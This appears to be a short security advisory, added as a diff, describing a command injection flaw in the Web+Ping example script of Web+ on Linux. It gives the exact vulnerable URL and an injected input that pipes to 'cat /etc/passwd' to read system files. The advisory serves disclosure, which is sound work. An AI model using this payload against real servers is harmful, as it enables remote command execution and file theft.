@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/1725/info
+
+Web+ is a development language for use in creating web-based client/server applications.
+
+In Linux versions of the product, an example script installed in Web+ (Web+Ping) which fails to correctly filter shell meta characters. As a result, parameters passed to this script may contain malicious shell commands, allowing an attacker to remotely execute or read any file which is accessible by the Web+ user.
+
+Windows NT versions of Web+ are apparently not vulnerable.
+
+To exploit simply place a '|' after the parameter you which to provide to
+ping and then the command you wish to execute.
+
+e.g:
+Goto:
+http://target/cgi-bin/webplus.cgi?Script=/webplus/webping/webping.wml
+
+Then type in host destination box:
+127.0.0.1 | cat /etc/passwd
+
+You will then be presented with the contents of the /etc/passwd file. 
